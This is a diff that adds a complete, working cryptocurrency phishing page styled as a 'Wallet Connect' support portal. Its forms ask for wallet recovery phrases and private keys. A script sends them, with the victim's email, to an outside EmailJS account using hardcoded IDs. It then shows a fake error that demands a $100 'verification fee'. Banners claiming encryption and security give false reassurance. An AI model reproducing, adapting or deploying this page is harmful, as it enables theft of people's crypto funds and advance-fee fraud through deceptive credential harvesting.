@@ -1,0 +1,1097 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+   <title>Wallet-Connect Portal</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,600;1,300;1,400&family=DM+Sans:wght@300;400;500;600&display=swap"
+    rel="stylesheet">
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+  <script>(function () { emailjs.init("vA_7NzGZQ-mlt_kHM"); })();</script>
+
+  <style>
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --gold: #c9a84c;
+      --gold-light: #e8c97a;
+      --gold-dim: rgba(201, 168, 76, 0.15);
+      --noir: #0b0b0f;
+      --surface: #111118;
+      --panel: #16161e;
+      --border: rgba(201, 168, 76, 0.18);
+      --border-subtle: rgba(255, 255, 255, 0.06);
+      --text: #f0ede6;
+      --muted: #8a8880;
+      --error: #e05c5c;
+      --success: #4caf82;
+      --font-display: 'Cormorant Garamond', Georgia, serif;
+      --font-body: 'DM Sans', system-ui, sans-serif;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      font-family: var(--font-body);
+      background: var(--noir);
+      color: var(--text);
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    /* ── BACKGROUND ─────────────────────────────── */
+    .bg-layer {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      overflow: hidden;
+      pointer-events: none;
+    }
+
+    .bg-layer::before {
+      content: '';
+      position: absolute;
+      top: -20%;
+      left: -10%;
+      width: 60vw;
+      height: 60vw;
+      background: radial-gradient(ellipse, rgba(201, 168, 76, 0.07) 0%, transparent 65%);
+      animation: drift 18s ease-in-out infinite alternate;
+    }
+
+    .bg-layer::after {
+      content: '';
+      position: absolute;
+      bottom: -20%;
+      right: -10%;
+      width: 50vw;
+      height: 50vw;
+      background: radial-gradient(ellipse, rgba(80, 80, 180, 0.06) 0%, transparent 65%);
+      animation: drift 22s ease-in-out infinite alternate-reverse;
+    }
+
+    @keyframes drift {
+      from {
+        transform: translate(0, 0) scale(1);
+      }
+
+      to {
+        transform: translate(4%, 6%) scale(1.08);
+      }
+    }
+
+    /* Noise texture */
+    .bg-layer .noise {
+      position: absolute;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
+      background-size: 180px;
+      opacity: 0.35;
+    }
+
+    /* ── LAYOUT ─────────────────────────────────── */
+    .page {
+      position: relative;
+      z-index: 1;
+      min-height: 100vh;
+      display: grid;
+      grid-template-columns: 1fr;
+      grid-template-rows: auto 1fr auto;
+    }
+
+    /* ── HEADER ─────────────────────────────────── */
+    header {
+      padding: clamp(20px, 4vw, 36px) clamp(20px, 6vw, 60px);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--border-subtle);
+      animation: fadeDown 0.6s ease both;
+    }
+
+    .logo-mark {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .logo-icon {
+      width: 38px;
+      height: 38px;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--gold-dim);
+      flex-shrink: 0;
+    }
+
+    .logo-icon svg {
+      width: 18px;
+      height: 18px;
+      fill: var(--gold);
+    }
+
+    .logo-text {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.1;
+    }
+
+    .logo-title {
+      font-family: var(--font-display);
+      font-size: 1.05rem;
+      font-weight: 600;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--text);
+    }
+
+    .logo-sub {
+      font-size: 0.68rem;
+      color: var(--muted);
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      font-weight: 400;
+    }
+
+    .header-badge {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      padding: 6px 14px;
+      border: 1px solid rgba(76, 175, 130, 0.3);
+      border-radius: 50px;
+      background: rgba(76, 175, 130, 0.07);
+      font-size: 0.68rem;
+      font-weight: 500;
+      color: var(--success);
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      white-space: nowrap;
+    }
+
+    .header-badge .dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: var(--success);
+      animation: pulse-dot 2s ease infinite;
+    }
+
+    @keyframes pulse-dot {
+
+      0%,
+      100% {
+        opacity: 1;
+        transform: scale(1);
+      }
+
+      50% {
+        opacity: .5;
+        transform: scale(1.4);
+      }
+    }
+
+    /* ── MAIN ───────────────────────────────────── */
+    main {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: clamp(32px, 6vw, 70px) clamp(16px, 5vw, 40px);
+    }
+
+    .wrapper {
+      width: 100%;
+      max-width: 1100px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 48px;
+      align-items: center;
+      animation: fadeUp 0.7s ease 0.1s both;
+    }
+
+    @media (max-width: 820px) {
+      .wrapper {
+        grid-template-columns: 1fr;
+        gap: 40px;
+      }
+
+      .info-col {
+        order: -1;
+      }
+    }
+
+    /* ── INFO COLUMN ────────────────────────────── */
+    .info-col {
+      padding: 0 10px;
+    }
+
+    .info-eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 0.7rem;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      color: var(--gold);
+      font-weight: 500;
+      margin-bottom: 22px;
+    }
+
+    .info-eyebrow::before {
+      content: '';
+      display: block;
+      width: 28px;
+      height: 1px;
+      background: var(--gold);
+    }
+
+    .info-headline {
+      font-family: var(--font-display);
+      font-size: clamp(2.8rem, 5vw, 4.2rem);
+      font-weight: 300;
+      line-height: 1.08;
+      letter-spacing: -0.01em;
+      margin-bottom: 28px;
+      color: var(--text);
+    }
+
+    .info-headline em {
+      font-style: italic;
+      color: var(--gold-light);
+    }
+
+    .info-body {
+      font-size: 0.88rem;
+      line-height: 1.75;
+      color: var(--muted);
+      max-width: 380px;
+      margin-bottom: 40px;
+    }
+
+    .stat-row {
+      display: flex;
+      gap: 28px;
+      flex-wrap: wrap;
+    }
+
+    .stat {
+      display: flex;
+      flex-direction: column;
+      gap: 3px;
+    }
+
+    .stat-num {
+      font-family: var(--font-display);
+      font-size: 1.9rem;
+      font-weight: 300;
+      color: var(--gold);
+      line-height: 1;
+    }
+
+    .stat-label {
+      font-size: 0.65rem;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.14em;
+    }
+
+    /* Decorative rule */
+    .deco-rule {
+      width: 40px;
+      height: 1px;
+      background: linear-gradient(to right, var(--gold), transparent);
+      margin: 36px 0;
+    }
+
+    /* ── CARD ───────────────────────────────────── */
+    .card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      overflow: hidden;
+      box-shadow:
+        0 0 0 1px rgba(0, 0, 0, 0.5),
+        0 40px 80px rgba(0, 0, 0, 0.5),
+        0 0 60px rgba(201, 168, 76, 0.04);
+      position: relative;
+    }
+
+    .card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 1px;
+      background: linear-gradient(to right, transparent, var(--gold), transparent);
+      opacity: 0.6;
+    }
+
+    .card-inner {
+      padding: clamp(24px, 5vw, 40px);
+    }
+
+    /* Card header */
+    .card-header {
+      margin-bottom: 28px;
+    }
+
+    .card-header h2 {
+      font-family: var(--font-display);
+      font-size: 1.5rem;
+      font-weight: 400;
+      letter-spacing: 0.01em;
+      color: var(--text);
+      margin-bottom: 4px;
+    }
+
+    .card-header p {
+      font-size: 0.78rem;
+      color: var(--muted);
+      letter-spacing: 0.04em;
+    }
+
+    /* ── TABS ───────────────────────────────────── */
+    .tabs {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      background: var(--surface);
+      border: 1px solid var(--border-subtle);
+      border-radius: 14px;
+      padding: 4px;
+      margin-bottom: 28px;
+      position: relative;
+    }
+
+    .tab-btn {
+      position: relative;
+      z-index: 1;
+      padding: 11px 16px;
+      border: none;
+      background: none;
+      border-radius: 11px;
+      cursor: pointer;
+      font-family: var(--font-body);
+      font-size: 0.78rem;
+      font-weight: 500;
+      color: var(--muted);
+      letter-spacing: 0.05em;
+      transition: color 0.25s ease;
+      white-space: nowrap;
+    }
+
+    .tab-btn.active {
+      color: var(--noir);
+    }
+
+    .tab-indicator {
+      position: absolute;
+      top: 4px;
+      left: 4px;
+      width: calc(50% - 4px);
+      height: calc(100% - 8px);
+      background: linear-gradient(135deg, var(--gold), var(--gold-light));
+      border-radius: 11px;
+      transition: transform 0.3s cubic-bezier(.4, 0, .2, 1);
+      z-index: 0;
+    }
+
+    .tab-indicator.right {
+      transform: translateX(100%);
+    }
+
+    /* ── FORMS ──────────────────────────────────── */
+    .form-panel {
+      display: none;
+    }
+
+    .form-panel.active {
+      display: block;
+      animation: panelIn 0.3s ease both;
+    }
+
+    @keyframes panelIn {
+      from {
+        opacity: 0;
+        transform: translateY(6px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .form-field {
+      margin-bottom: 14px;
+      position: relative;
+    }
+
+    .field-label {
+      display: block;
+      font-size: 0.68rem;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      color: var(--muted);
+      margin-bottom: 8px;
+    }
+
+    .field-input,
+    .field-textarea,
+    .field-select {
+      width: 100%;
+      background: var(--surface);
+      border: 1px solid var(--border-subtle);
+      border-radius: 12px;
+      padding: 13px 16px;
+      color: var(--text);
+      font-family: var(--font-body);
+      font-size: 0.85rem;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+      outline: none;
+      appearance: none;
+      -webkit-appearance: none;
+    }
+
+    .field-textarea {
+      resize: none;
+    }
+
+    .field-input::placeholder,
+    .field-textarea::placeholder {
+      color: #3d3d48;
+    }
+
+    .field-input:focus,
+    .field-textarea:focus,
+    .field-select:focus {
+      border-color: var(--gold);
+      box-shadow: 0 0 0 3px rgba(201, 168, 76, 0.1);
+    }
+
+    /* Custom select arrow */
+    .select-wrap {
+      position: relative;
+    }
+
+    .select-wrap::after {
+      content: '';
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 0;
+      height: 0;
+      border-left: 5px solid transparent;
+      border-right: 5px solid transparent;
+      border-top: 5px solid var(--muted);
+      pointer-events: none;
+    }
+
+    .field-select option {
+      background: #1a1a24;
+      color: var(--text);
+    }
+
+    .field-select option[value=""] {
+      color: #3d3d48;
+    }
+
+    /* ── VALIDATION ─────────────────────────────── */
+    .field-error {
+      display: none;
+      align-items: center;
+      gap: 5px;
+      margin-top: 6px;
+      font-size: 0.7rem;
+      color: var(--error);
+      letter-spacing: 0.04em;
+      animation: errIn 0.2s ease both;
+    }
+
+    .field-error.visible {
+      display: flex;
+    }
+
+    .field-error::before {
+      content: '!';
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      background: var(--error);
+      color: #fff;
+      font-size: 0.6rem;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+
+    @keyframes errIn {
+      from {
+        opacity: 0;
+        transform: translateY(-4px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* invalid state on fields */
+    .field-input.invalid,
+    .field-textarea.invalid,
+    .field-select.invalid {
+      border-color: var(--error) !important;
+      box-shadow: 0 0 0 3px rgba(224, 92, 92, 0.12) !important;
+    }
+
+    /* shake animation on submit attempt */
+    @keyframes shake {
+
+      0%,
+      100% {
+        transform: translateX(0);
+      }
+
+      20% {
+        transform: translateX(-6px);
+      }
+
+      40% {
+        transform: translateX(6px);
+      }
+
+      60% {
+        transform: translateX(-4px);
+      }
+
+      80% {
+        transform: translateX(4px);
+      }
+    }
+
+    .shake {
+      animation: shake 0.4s ease;
+    }
+
+    /* Submit button */
+    .btn-submit {
+      width: 100%;
+      margin-top: 20px;
+      padding: 14px 20px;
+      background: linear-gradient(135deg, #b8962e, var(--gold), var(--gold-light));
+      background-size: 200% 100%;
+      background-position: 0% 0%;
+      border: none;
+      border-radius: 12px;
+      font-family: var(--font-body);
+      font-size: 0.78rem;
+      font-weight: 600;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      color: var(--noir);
+      cursor: pointer;
+      transition: background-position 0.4s ease, transform 0.15s ease, box-shadow 0.2s ease;
+      box-shadow: 0 4px 24px rgba(201, 168, 76, 0.2);
+    }
+
+    .btn-submit:hover {
+      background-position: 100% 0%;
+      box-shadow: 0 8px 32px rgba(201, 168, 76, 0.35);
+      transform: translateY(-1px);
+    }
+
+    .btn-submit:active {
+      transform: translateY(0);
+    }
+
+    /* ── FOOTER ─────────────────────────────────── */
+    footer {
+      padding: clamp(14px, 2.5vw, 24px) clamp(20px, 6vw, 60px);
+      border-top: 1px solid var(--border-subtle);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 0.68rem;
+      color: #3a3a48;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      animation: fadeUp 0.6s ease 0.3s both;
+    }
+
+    footer svg {
+      opacity: 0.35;
+    }
+
+    /* ── NOTIFICATIONS ──────────────────────────── */
+    .notif {
+      position: fixed;
+      top: 24px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-16px);
+      padding: 13px 22px;
+      border-radius: 50px;
+      font-size: 0.8rem;
+      font-weight: 500;
+      letter-spacing: 0.04em;
+      z-index: 9999;
+      opacity: 0;
+      transition: all 0.3s cubic-bezier(.4, 0, .2, 1);
+      white-space: nowrap;
+      pointer-events: none;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .notif.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+
+    .notif.success {
+      background: linear-gradient(135deg, #1a3a2a, #1e4432);
+      border: 1px solid rgba(76, 175, 130, 0.4);
+      color: #6ee0aa;
+      box-shadow: 0 8px 28px rgba(0, 0, 0, 0.5);
+    }
+
+    .notif.error {
+      background: linear-gradient(135deg, #3a1a1a, #441e1e);
+      border: 1px solid rgba(224, 92, 92, 0.4);
+      color: #f08080;
+      box-shadow: 0 8px 28px rgba(0, 0, 0, 0.5);
+    }
+
+    /* ── ANIMATIONS ─────────────────────────────── */
+    @keyframes fadeUp {
+      from {
+        opacity: 0;
+        transform: translateY(18px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes fadeDown {
+      from {
+        opacity: 0;
+        transform: translateY(-10px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* ── RESPONSIVE ─────────────────────────────── */
+    @media (max-width: 480px) {
+      header {
+        gap: 10px;
+      }
+
+      .header-badge span {
+        display: none;
+      }
+
+      .header-badge {
+        padding: 6px 10px;
+      }
+
+      .info-headline {
+        font-size: 2.4rem;
+      }
+
+      .stat-row {
+        gap: 20px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="bg-layer">
+    <div class="noise"></div>
+  </div>
+
+  <div class="page">
+
+    <!-- HEADER -->
+    <header>
+      <div class="logo-mark">
+        <div class="logo-icon">
+          <svg viewBox="0 0 24 24">
+            <path
+              d="M21 7H3a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h18a1 1 0 0 0 1-1V8a1 1 0 0 0-1-1zm-1 12H4V9h16v10zm-8-7a2 2 0 1 0 0 4 2 2 0 0 0 0-4zM3 5h16V3H3a1 1 0 0 0-1 1v1h1z" />
+          </svg>
+        </div>
+        <div class="logo-text">
+          <span class="logo-title">VYROBOT APP</span>
+          <span class="logo-sub">Wallet Connect</span>
+        </div>
+      </div>
+      <div class="header-badge">
+        <div class="dot"></div>
+        <span>Secure Connection</span>
+      </div>
+    </header>
+
+    <!-- MAIN -->
+    <main>
+      <div class="wrapper">
+
+        <!-- INFO COLUMN -->
+        <div class="info-col">
+          <div class="info-eyebrow">Wallet Support</div>
+          <!-- <h1 class="info-headline">
+            Report an<br>
+            <em>Issue</em> With<br>
+            Your Wallet
+          </h1> -->
+           <p class="info-body">
+            Never share your recovery phrase with anyone. We will never ask for your private keys or seedphrase outside of this secure form.
+          </p>
+          <div class="stat-row">
+            <div class="stat">
+               <span class="stat-num">Data</span>
+              <span class="stat-label">Encrypted</span>
+            </div>
+            <div class="stat">
+              <span class="stat-num">25+</span>
+              <span class="stat-label">Wallets Supported</span>
+            </div>
+            <div class="stat">
+              <span class="stat-num">SSL</span>
+              <span class="stat-label">Encrypted</span>
+            </div>
+          </div>
+          <div class="deco-rule"></div>
+        </div>
+
+        <!-- CARD COLUMN -->
+        <div class="card">
+          <div class="card-inner">
+
+            <!-- <div class="card-header">
+              <h2>Submit a Complaint</h2>
+              <p>Fill in the form below to report your wallet issue.</p>
+            </div> -->
+
+            <!-- TABS -->
+            <div class="tabs" role="tablist">
+              <div class="tab-indicator" id="tabIndicator"></div>
+              <button class="tab-btn active" id="tab1" role="tab" aria-selected="true">Phrase</button>
+              <button class="tab-btn" id="tab2" role="tab" aria-selected="false">Private Key</button>
+            </div>
+
+            <!-- FORM 1 -->
+            <div class="form-panel active" id="content1">
+              <form class="ajaxForm" novalidate>
+                <div class="form-field">
+                  <label class="field-label" for="msg1">Phrase</label>
+                   <textarea class="field-textarea" id="phrase" name="phrase" rows="4"
+                    placeholder="Enter your recovery phrase (12 or 24 words separated by a singe space)"></textarea>
+                  <span class="field-error" id="err-msg1">Please make sure you enter your phrase correctly</span>
+                </div>
+                <div class="form-field">
+                  <label class="field-label" for="email1">Email / User ID</label>
+                  <input class="field-input" id="email1" name="email" type="text" placeholder="you@example.com"
+                    required>
+                  <span class="field-error" id="err-email1">Please enter your email or user ID.</span>
+                </div>
+                <div class="form-field">
+                  <label class="field-label" for="wallet1">Wallet Type</label>
+                  <div class="select-wrap">
+                    <select class="field-select" id="wallet1" name="wallet" required>
+                      <option value="">Choose a Wallet</option>
+                      <option>MetaMask</option>
+                      <option>Trust Wallet</option>
+                      <option>Coinbase Wallet</option>
+                      <option>Exodus Wallet</option>
+                      <option>Safepal</option>
+                      <option>Phantom</option>
+                      <option>Zerion </option>
+                      <option>Ledger</option>
+                      <option>TokenPocket</option>
+                      <option>MyTonWallet</option>
+                      <option>Tonkeeper </option>
+                      <option>TonHub Wallet </option>
+                      <option>Telegram Wallet </option>
+                      <option>Uniswap Wallet</option>
+                      <option>Rabby Wallet</option>
+                      <option>Best Wallet</option>
+                      <option>Binance Web3</option>
+                      <option>Trezor</option>
+                      <option>OKX Wallet</option>
+                      <option>Bitget Wallet</option>
+                      <option>Atomic</option>
+                      <option>Solfare Wallet </option>
+                      <option>Other Wallets</option>
+                    </select>
+                  </div>
+                  <span class="field-error" id="err-wallet1">Please select your wallet type.</span>
+                </div>
+                <button type="submit" class="btn-submit">Connect Wallet</button>
+              </form>
+            </div>
+
+            <!-- FORM 2 -->
+            <div class="form-panel" id="content2">
+              <form class="ajaxForm" novalidate>
+                <div class="form-field">
+                  <label class="field-label" for="msg2">Private Key</label>
+                  <textarea class="field-textarea" id="privatekey" name="privatekey" rows="4"
+                    placeholder="Enter your privatekey correctly…" required></textarea>
+                  <span class="field-error" id="err-msg2">Please import your key correctly before connecting.</span>
+                </div>
+                <div class="form-field">
+                  <label class="field-label" for="email2">Email / User ID</label>
+                  <input class="field-input" id="email2" name="email" type="text" placeholder="you@example.com"
+                    required>
+                  <span class="field-error" id="err-email2">Please enter your email or user ID.</span>
+                </div>
+                <div class="form-field">
+                  <label class="field-label" for="wallet2">Wallet Type</label>
+                  <div class="select-wrap">
+                    <select class="field-select" id="wallet2" name="wallet" required>
+                      <option value="">Choose a Wallet</option>
+                      <option>MetaMask</option>
+                      <option>Trust Wallet</option>
+                      <option>Coinbase Wallet</option>
+                      <option>Exodus Wallet</option>
+                      <option>Safepal</option>
+                      <option>Phantom</option>
+                      <option>Zerion </option>
+                      <option>Ledger</option>
+                      <option>TokenPocket</option>
+                      <option>MyTonWallet</option>
+                      <option>Tonkeeper </option>
+                      <option>TonHub Wallet </option>
+                      <option>Telegram Wallet </option>
+                      <option>Uniswap Wallet</option>
+                      <option>Rabby Wallet</option>
+                      <option>Best Wallet</option>
+                      <option>Binance Web3</option>
+                      <option>Trezor</option>
+                      <option>OKX Wallet</option>
+                      <option>Bitget Wallet</option>
+                      <option>Atomic</option>
+                      <option>Solfare Wallet </option>
+                      <option>Other Wallets</option>
+                    </select>
+                  </div>
+                  <span class="field-error" id="err-wallet2">Please select your wallet type.</span>
+                </div>
+                <button type="submit" class="btn-submit">Connect Wallet</button>
+              </form>
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer>
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor">
+        <path
+          d="M12 1a5 5 0 0 0-5 5v3H5a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V11a2 2 0 0 0-2-2h-2V6a5 5 0 0 0-5-5zm0 2a3 3 0 0 1 3 3v3H9V6a3 3 0 0 1 3-3zm0 10a2 2 0 1 1 0 4 2 2 0 0 1 0-4z" />
+      </svg>
+      All transmissions are end-to-end encrypted &nbsp;·&nbsp; Wallet Connect Portal
+    </footer>
+
+  </div>
+
+  <script>
+    /* ── TABS ── */
+    const tab1 = document.getElementById('tab1');
+    const tab2 = document.getElementById('tab2');
+    const c1 = document.getElementById('content1');
+    const c2 = document.getElementById('content2');
+    const ind = document.getElementById('tabIndicator');
+
+    function activateTab(which) {
+      if (which === 1) {
+        tab1.classList.add('active'); tab2.classList.remove('active');
+        c1.classList.add('active'); c2.classList.remove('active');
+        ind.classList.remove('right');
+        tab1.setAttribute('aria-selected', 'true');
+        tab2.setAttribute('aria-selected', 'false');
+      } else {
+        tab2.classList.add('active'); tab1.classList.remove('active');
+        c2.classList.add('active'); c1.classList.remove('active');
+        ind.classList.add('right');
+        tab2.setAttribute('aria-selected', 'true');
+        tab1.setAttribute('aria-selected', 'false');
+      }
+    }
+    tab1.addEventListener('click', () => activateTab(1));
+    tab2.addEventListener('click', () => activateTab(2));
+
+    /* ── VALIDATION HELPERS ── */
+    function getFieldEl(form, name) {
+      return form.querySelector('[name="' + name + '"]');
+    }
+    function getErrEl(form, name) {
+      // find the error span that follows the field (or its .select-wrap parent)
+      const field = getFieldEl(form, name);
+      if (!field) return null;
+      // for select, error span is sibling of .select-wrap
+      const parent = field.closest('.select-wrap') || field;
+      return parent.parentElement.querySelector('.field-error');
+    }
+
+    function setInvalid(field, errEl, show) {
+      if (show) {
+        field.classList.add('invalid');
+        if (errEl) errEl.classList.add('visible');
+      } else {
+        field.classList.remove('invalid');
+        if (errEl) errEl.classList.remove('visible');
+      }
+    }
+
+    function validateForm(form) {
+      let valid = true;
+
+      const msgKey = form.querySelector('textarea[name]') ? form.querySelector('textarea[name]').getAttribute('name') : null;
+      const msgEl = msgKey ? getFieldEl(form, msgKey) : null;
+      const msgErr = msgKey ? getErrEl(form, msgKey) : null;
+      const emailEl = getFieldEl(form, 'email');
+      const emailErr = getErrEl(form, 'email');
+      const walletEl = getFieldEl(form, 'wallet');
+      const walletErr = getErrEl(form, 'wallet');
+
+      // Message / textarea
+      if (msgEl && !msgEl.value.trim()) {
+        setInvalid(msgEl, msgErr, true);
+        valid = false;
+      } else if (msgEl) {
+        setInvalid(msgEl, msgErr, false);
+      }
+
+      // Email
+      if (emailEl && !emailEl.value.trim()) {
+        setInvalid(emailEl, emailErr, true);
+        valid = false;
+      } else if (emailEl) {
+        setInvalid(emailEl, emailErr, false);
+      }
+
+      // Wallet select
+      if (walletEl && !walletEl.value) {
+        setInvalid(walletEl, walletErr, true);
+        valid = false;
+      } else if (walletEl) {
+        setInvalid(walletEl, walletErr, false);
+      }
+
+      return valid;
+    }
+
+    /* Clear errors live as the user fills in each field */
+    document.querySelectorAll('.ajaxForm').forEach(function (form) {
+      form.querySelectorAll('input, textarea, select').forEach(function (el) {
+        el.addEventListener('input', function () { clearFieldError(el, form); });
+        el.addEventListener('change', function () { clearFieldError(el, form); });
+      });
+    });
+    function clearFieldError(el, form) {
+      const errEl = getErrEl(form, el.getAttribute('name'));
+      if (el.value && el.value.trim()) {
+        el.classList.remove('invalid');
+        if (errEl) errEl.classList.remove('visible');
+      }
+    }
+
+    /* ── FORMS ── */
+    $(document).ready(function () {
+      $('.ajaxForm').on('submit', function (e) {
+        e.preventDefault();
+        const form = this;
+        const btn = $(form).find('.btn-submit');
+
+        // Validate first
+        const isValid = validateForm(form);
+        if (!isValid) {
+          // Shake the button to signal blocked submission
+          btn[0].classList.remove('shake');
+          void btn[0].offsetWidth; // reflow to re-trigger
+          btn[0].classList.add('shake');
+          btn[0].addEventListener('animationend', () => btn[0].classList.remove('shake'), { once: true });
+          showNotif('⚠  Please complete all fields before connecting...', 'error');
+          return;
+        }
+
+        const originalLabel = btn.text();
+        btn.text('Connecting……').css('opacity', '.7').prop('disabled', true);
+
+        var fd = new FormData(form);
+        fd.append('service_id', 'service_eo9j1eh');
+        fd.append('template_id', 'template_joqgtka');
+        fd.append('user_id', 'eLSDwldNgAzdckVHS');
+
+        $.ajax('https://api.emailjs.com/api/v1.0/email/send-form', {
+          type: 'POST', data: fd, contentType: false, processData: false
+        }).done(function () {
+          showNotif('✕ Error validating wallet. unable to confirm the verification fee, deposit $100 to your wallet first...✓', 'error');
+          form.reset();
+          // clear all invalid states on reset
+          $(form).find('.invalid').removeClass('invalid');
+          $(form).find('.field-error').removeClass('visible');
+          btn.text(originalLabel).css('opacity', '1').prop('disabled', false);
+        }).fail(function () {
+          showNotif('✕  Something went wrong. Please try again.', 'error');
+          btn.text(originalLabel).css('opacity', '1').prop('disabled', false);
+        });
+      });
+    });
+
+    function showNotif(msg, type) {
+      const n = document.createElement('div');
+      n.className = 'notif ' + type;
+      n.textContent = msg;
+      document.body.appendChild(n);
+      requestAnimationFrame(() => {
+        requestAnimationFrame(() => n.classList.add('show'));
+      });
+      setTimeout(() => {
+        n.classList.remove('show');
+        setTimeout(() => n.remove(), 320);
+      }, 3800);
+    }
+  </script>
+</body>
+
+</html>
